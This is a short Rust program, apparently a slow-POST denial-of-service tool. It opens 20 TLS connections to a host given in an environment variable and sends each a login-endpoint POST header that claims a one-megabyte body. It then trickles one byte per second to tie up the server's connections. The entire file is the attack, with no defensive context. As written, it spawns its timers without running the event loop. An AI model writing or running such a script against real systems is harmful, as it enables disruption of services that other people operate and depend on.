extern crate futures;
extern crate native_tls;

extern crate tokio_core;
extern crate tokio_timer;

use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;

use futures::*;
use tokio_timer::*;
use tokio_core::reactor::{ Core, Interval };

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let timeout = 1;
    let connections_count = 20;

    let mut core = Core::new().unwrap();
    let handle = core.handle();
    for index in 0..connections_count {
        let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\n", host);
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
        let mut stream = connector.connect(&host, stream).unwrap();
        stream.write(start.as_bytes());

        let timer = Timer::default().interval(Duration::from_secs(timeout)).for_each(move |_| {
            stream.write(b"a");
            stream.flush();
            println!("Stream number: {} written.", index);
            Ok(())
        });
        handle.spawn(timer.map_err(|_| ()));
    }
}